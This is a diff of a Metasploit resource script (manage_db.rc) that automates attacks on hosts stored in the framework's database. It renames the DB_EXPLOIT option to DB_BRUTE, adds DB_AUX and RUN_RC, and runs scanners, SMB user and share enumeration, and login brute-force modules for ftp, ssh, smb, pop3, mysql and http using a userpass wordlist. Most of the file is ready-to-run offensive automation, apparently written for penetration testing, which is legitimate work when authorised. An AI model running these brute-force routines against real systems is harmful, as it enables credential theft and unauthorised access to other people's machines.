@@ -9,14 +9,14 @@
     Execute in msfconsole:
        setg CLEAN <true-or-blank>
        setg RECORD <true-or-blank>
-       setg DB_EXPLOIT <service-name>
+       setg DB_AUX <service-name>
+       setg DB_BRUTE <service-name>
        setg XML_EXPORT <true-or-blank>
-       setg WORKSPACE <new-workspace-name>
-       setg WORKSPACE_DEL <delete-workspace-name>
        setg DBHOST <asign-RHOSTS-var-to-msfconsole>
        setg XML_IMPORT <absoluct-path-of-file.xml-to-import>
        setg TXT_IMPORT <absoluct-path-of-hosts-list.txt-to-import>
-       resource <path-to-script>/managedb.rc
+       setg RUN_RC /root/script.rc <absoluct-path-of-rc-to-execute>
+       resource <path-to-script>/manage_db.rc
 
     Author:
        r00t-3xp10it  <pedroubuntu10[at]gmail.com>
@@ -28,16 +28,6 @@
 
     if (framework.datastore['RECORD'] == "true")
        run_single("spool /root/database.log")
-       Rex::sleep(1.0)
-    end
-
-    unless (framework.datastore['WORKSPACE'] == nil or framework.datastore['WORKSPACE'] == '')
-       run_single("workspace -a #{framework.datastore['WORKSPACE']}")
-       Rex::sleep(1.0)
-    end
-
-    unless (framework.datastore['WORKSPACE_DEL'] == nil or framework.datastore['WORKSPACE_DEL'] == '')
-       run_single("workspace -d #{framework.datastore['WORKSPACE_DEL']}")
        Rex::sleep(1.0)
     end
 
@@ -82,34 +72,92 @@
        Rex::sleep(1.0)
     end
 
+
     run_single("workspace -v")
     Rex::sleep(0.5)
-    run_single("hosts -c address,name,os_name,os_flavor,os_sp,purpose")
-    print_line("")
-    Rex::sleep(0.5)
-    run_single("services -c port,proto,name,state")
-    Rex::sleep(2.0)
+    xhost = framework.db.hosts.map(&:address).join(' ')
+    unless xhost.nil? or xhost == ''
+       run_single("hosts -c address,name,os_name,os_flavor,os_sp,purpose")
+       print_line("")
+       Rex::sleep(0.5)
+       run_single("services -c port,proto,name,state -u")
+       Rex::sleep(2.0)
+    end
     print_line("")
 
-    unless (framework.datastore['DB_EXPLOIT'] == nil or framework.datastore['DB_EXPLOIT'] == '')
+
+
+    unless (framework.datastore['DB_AUX'] == nil or framework.datastore['DB_AUX'] == '')
+       unless xhost.nil? or xhost == ''
+       if (framework.datastore['DB_AUX'] == "ftp")
+          print_warning("Sellecting 10 auxiliays to ftp service")
+          Rex::sleep(1.0)
+          run_single("grep -m 10 scanner search name:ftp type:auxiliary")
+          print_line("")
+       elsif (framework.datastore['DB_AUX'] == "ssh")
+          print_warning("Sellecting 10 auxiliays to ssh service")
+          Rex::sleep(1.0)
+          run_single("grep -m 10 scanner search name:ssh type:auxiliary")
+          print_line("")
+       elsif (framework.datastore['DB_AUX'] == "telnet")
+          print_warning("Sellecting 10 auxiliays to telnet service")
+          Rex::sleep(1.0)
+          run_single("grep -m 10 scanner search name:telnet type:auxiliary")
+          print_line("")
+       elsif (framework.datastore['DB_AUX'] == "smb" or framework.datastore['DB_AUX'] == "microsoft-ds" or framework.datastore['DB_AUX'] == "netbios-ssn")
+          print_warning("Sellecting 10 auxiliays to smb service")
+          Rex::sleep(1.0)
+          run_single("grep -m 10 scanner search name:smb type:auxiliary")
+          print_line("")
+       elsif (framework.datastore['DB_AUX'] == "pop3")
+          print_warning("Sellecting 10 auxiliays to pop3 service")
+          Rex::sleep(1.0)
+          run_single("grep -m 10 scanner search name:pop3 type:auxiliary")
+          print_line("")
+       elsif (framework.datastore['DB_AUX'] == "mssql")
+          print_warning("Sellecting 10 auxiliays to mssql service")
+          Rex::sleep(1.0)
+          run_single("grep -m 10 scanner search name:mssql type:auxiliary")
+          print_line("")
+       elsif (framework.datastore['DB_AUX'] == "mysql")
+          print_warning("Sellecting 10 auxiliays to mysql service")
+          Rex::sleep(1.0)
+          run_single("grep -m 10 scanner search name:mysql type:auxiliary")
+          print_line("")
+       elsif (framework.datastore['DB_AUX'] == "http")
+          print_warning("Sellecting 10 auxiliays to http service")
+          Rex::sleep(1.0)
+          run_single("grep -m 10 scanner search name:http type:auxiliary")
+          print_line("")
+       else
+          print_error("[ERROR] This rc script does not support service: [#{framework.datastore['DB_AUX']}] search.")
+          Rex::sleep(2.0)
+          run_single("unsetg all")
+          return nil
+       end
+       end
+    end
+
+
+    unless (framework.datastore['DB_BRUTE'] == nil or framework.datastore['DB_BRUTE'] == '')
        xport = framework.db.services.map(&:port).join(' ')
        proto = framework.db.services.map(&:name).join(' ')
-       unless proto =~ /#{framework.datastore['DB_EXPLOIT']}/i
-            print_error("[ERROR] Service: [#{framework.datastore['DB_EXPLOIT']}] not found in db")
+       unless proto =~ /#{framework.datastore['DB_BRUTE']}/i
+            print_error("[ERROR] Service: [#{framework.datastore['DB_BRUTE']}] not found in db")
             Rex::sleep(2.5)
-            run_single("unsetg RHOSTS CLEAN RECORD DBHOST TXT_IMPORT XML_IMPORT XML_EXPORT WORKSPACE WORKSPACE_DEL DB_EXPLOIT")
+            run_single("unsetg all")
             return nil
        end
        run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
          if xport =~ /21/i or proto =~ /ftp/i
-           if (framework.datastore['DB_EXPLOIT'] == "ftp")
+           if (framework.datastore['DB_BRUTE'] == "ftp")
               print_warning("Remote Target port: 21 ftp found")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/ftp/ftp_version")
-              run_single("services -c name -S ftp -R")
+              run_single("services -c name -S ftp -u -R")
               run_single("exploit")
               run_single("use auxiliary/scanner/ftp/anonymous")
-              run_single("services -c name -S ftp -R")
+              run_single("services -c name -S ftp -u -R")
               run_single("set THREADS 35")
               run_single("exploit")
               run_single("use auxiliary/scanner/ftp/ftp_login")
@@ -117,13 +165,13 @@
               run_single("set STOP_ON_SUCCESS true")
               run_single("set BRUTEFORCE_SPEED 4")
               run_single("set THREADS 70")
-              run_single("services -c name -S ftp -R")
+              run_single("services -c name -S ftp -u -R")
               run_single("exploit")
            end
          end
 
          if xport =~ /22/i or proto =~ /ssh/i
-           if (framework.datastore['DB_EXPLOIT'] == "ssh")
+           if (framework.datastore['DB_BRUTE'] == "ssh")
               print_warning("Remote Target port: 22 ssh found")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/ssh/ssh_login")
@@ -131,13 +179,13 @@
               run_single("set STOP_ON_SUCCESS true")
               run_single("set VERBOSE true")
               run_single("set THREADS 30")
-              run_single("services -c name -S ssh -R")
+              run_single("services -c name -S ssh -u -R")
               run_single("exploit")
            end
          end
 
          if xport =~ /23/i or proto =~ /telnet/i
-           if (framework.datastore['DB_EXPLOIT'] == "telnet")
+           if (framework.datastore['DB_BRUTE'] == "telnet")
               print_warning("Remote Target port: 23 telnet found")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/telnet/telnet_version")
@@ -152,53 +200,57 @@
          end
 
          if xport =~ /110/i or proto =~ /pop3/i
-           if (framework.datastore['DB_EXPLOIT'] == "pop3")
+           if (framework.datastore['DB_BRUTE'] == "pop3")
               print_warning("Remote Target port: 110 pop3 found")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/pop3/pop3_version")
               run_single("set THREADS 30")
-              run_single("services -c name -S pop3 -R")
+              run_single("services -c name -S pop3 -u -R")
               run_single("exploit")
               run_single("use auxiliary/scanner/pop3/pop3_login")
               run_single("set STOP_ON_SUCCESS true")
               run_single("set THREADS 16")
-              run_single("services -c name -S pop3 -R")
+              run_single("services -c name -S pop3 -u -R")
               run_single("exploit")
            end
          end
 
-         if xport =~ /445/i or proto =~ /smb/i
-           if (framework.datastore['DB_EXPLOIT'] == "smb")
+         if xport =~ /445/i or proto =~ /smb/i or proto =~ /microsoft-ds/i or proto =~ /netbios-ssn/i or proto =~ /msrpc/i
+           if (framework.datastore['DB_BRUTE'] == "smb")
               print_warning("Remote Target port: 445 smb found")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/smb/smb_version")
               run_single("set THREADS 16")
-              run_single("services -c name -S smb -R")
+              run_single("services -c name -S smb -u -R")
+              run_single("exploit")
+              run_single("use auxiliary/scanner/smb/smb_lookupid")
+              run_single("set THREADS 16")
+              run_single("services -c name -S smb -u -R")
               run_single("exploit")
               run_single("use auxiliary/scanner/smb/smb_enumusers")
               run_single("set THREADS 16")
-              run_single("services -c name -S smb -R")
+              run_single("services -c name -S smb -u -R")
               run_single("exploit")
               run_single("use auxiliary/scanner/smb/smb_enumshares")
               run_single("set THREADS 16")
-              run_single("services -c name -S smb -R")
+              run_single("services -c name -S smb -u -R")
               run_single("exploit")
               run_single("use auxiliary/scanner/smb/smb_login")
               run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
               run_single("set STOP_ON_SUCCESS true")
               run_single("set THREADS 16")
-              run_single("services -c name -S smb -R")
+              run_single("services -c name -S smb -u -R")
               run_single("exploit")
            end
          end
 
          if xport =~ /3306/i or proto =~ /mysql/i
-           if (framework.datastore['DB_EXPLOIT'] == "mysql")
+           if (framework.datastore['DB_BRUTE'] == "mysql")
               print_warning("Remote Target port 3306 mysql found.")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/mysql/mysql_version")
               run_single("set THREADS 20")
-              run_single("services -c name -S mysql -R")
+              run_single("services -c name -S mysql -u -R")
               run_single("exploit")
               Rex::sleep(1.5)
               run_single("use auxiliary/scanner/mysql/mysql_login")
@@ -207,34 +259,44 @@
               run_single("set BLANK_PASSWORDS true")
               run_single("set VERBOSE true")
               run_single("set THREADS 100")
-              run_single("services -c name -S mysql -R")
+              run_single("services -c name -S mysql -u -R")
               run_single("exploit")
               Rex::sleep(1.5)
            end
          end
 
          if xport =~ /80/i or proto =~ /http/i
-           if (framework.datastore['DB_EXPLOIT'] == "http")
+           if (framework.datastore['DB_BRUTE'] == "http")
               print_warning("Remote Target port: 80 http found")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/http/title")
-              run_single("services -c name -S http -R")
+              run_single("services -c name -S http -u -R")
               run_single("exploit")
               run_single("use auxiliary/scanner/http/options")
               run_single("set THREADS 11")
-              run_single("services -c name -S http -R")
+              run_single("services -c name -S http -u -R")
               run_single("exploit")
               run_single("use auxiliary/scanner/http/dir_scanner")
               run_single("exploit")
               run_single("use auxiliary/scanner/http/http_login")
               run_single("set STOP_ON_SUCCESS true")
               run_single("set THREADS 16")
-              run_single("services -c name -S http -R")
+              run_single("services -c name -S http -u -R")
               run_single("exploit")
            end
          end
     end
 
+   unless (framework.datastore['RUN_RC'] == nil or framework.datastore['RUN_RC'] == '')
+      exec_rc = "#{framework.datastore['RUN_RC']}"
+      unless (File.exist?(exec_rc))
+         print_error("[ERROR] resource script to execute not found.")
+         print_warning("[ERROR] #{exec_rc}")
+         run_single("unsetg all")
+         return nil
+      end
+      run_single("resource #{exec_rc}")
+   end
 
    if (framework.datastore['XML_EXPORT'] == "true")
       print_warning("Exporting database to: /root/database.xml")
@@ -242,19 +304,19 @@
       run_single("db_export -f xml /root/database.xml")
    end
 
-   print_warning("Please wait, Cleaning global variables.")
+   print_warning("Cleaning global variables.")
    Rex::sleep(1.5)
    if (framework.datastore['CLEAN'] == "true")
-      run_single("unsetg RHOSTS CLEAN RECORD DBHOST TXT_IMPORT XML_IMPORT XML_EXPORT WORKSPACE WORKSPACE_DEL DB_EXPLOIT")
-      run_single("unset VERBOSE THREADS PORTS")
-      print_warning("Please wait, Cleaning database.")
+      run_single("unsetg all")
+      run_single("unset all")
+      print_warning("Cleaning database.")
       Rex::sleep(1.5)
       run_single("hosts -d")
       run_single("services -d")
       print_line("")
    else
-      run_single("unsetg RHOSTS CLEAN RECORD DBHOST TXT_IMPORT XML_IMPORT XML_EXPORT WORKSPACE WORKSPACE_DEL DB_EXPLOIT")
-      run_single("unset VERBOSE THREADS PORTS")
+      run_single("unsetg all")
+      run_single("unset all")
       print_line("")
    end
 
@@ -264,13 +326,13 @@
    print_line("setg CLEAN true                Clean database at exit")
    print_line("setg RECORD true               Record msfconsole activity")
    print_line("setg DBHOST 10.10.10.3         Asign RHOSTS var to msfconsole")
-   print_line("setg WORKSPACE pedro           Add workspace pedro to database")
-   print_line("setg WORKSPACE_DEL pedro       Delete workspace pedro from database")
    print_line("setg XML_EXPORT true           Export contents of db to database.xml")
    print_line("setg XML_IMPORT /root/dic.xml  Import database.xml file to db")
    print_line("setg TXT_IMPORT /root/dic.txt  Import text hosts list (one-per-line)")
-   print_line("setg DB_EXPLOIT smb            Auto-Exploit db hosts based on service name")
-   print_line("resource /root/managedb.rc     Execute this resource script")
+   print_line("setg DB_BRUTE smb              Auto-Exploit db hosts based on service name")
+   print_line("setg DB_AUX ssh                Auto-search auxiliarys based on host service name")
+   print_line("setg RUN_RC /root/script.rc    Execute script.rc after manage_db.rc execution")
+   print_line("resource /root/manage_db.rc    Execute this resource script")
    print_line("")
 
 </ruby>
